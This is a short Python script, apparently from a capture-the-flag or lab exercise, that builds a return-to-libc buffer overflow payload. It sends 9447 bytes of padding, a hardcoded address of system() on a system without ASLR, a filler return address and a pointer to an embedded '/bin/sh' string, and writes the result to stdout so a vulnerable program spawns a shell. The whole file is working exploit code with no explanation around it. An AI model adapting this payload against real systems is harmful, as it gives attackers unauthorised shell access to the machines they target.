import os
import sys
import struct

# No ASLR system.
system = 0xf7e23eb0

def exploit(addr):
	exploit = b"A" * 9447
	exploit += struct.pack("<I", system)

	exploit += b"ACBD"

	bin_sh_addr = struct.pack("<I", addr + 9447 + 8)
	print(bin_sh_addr, file=sys.stderr)
	exploit += bin_sh_addr

	exploit += b"/bin/sh\x00\n"

	os.write(1, exploit)
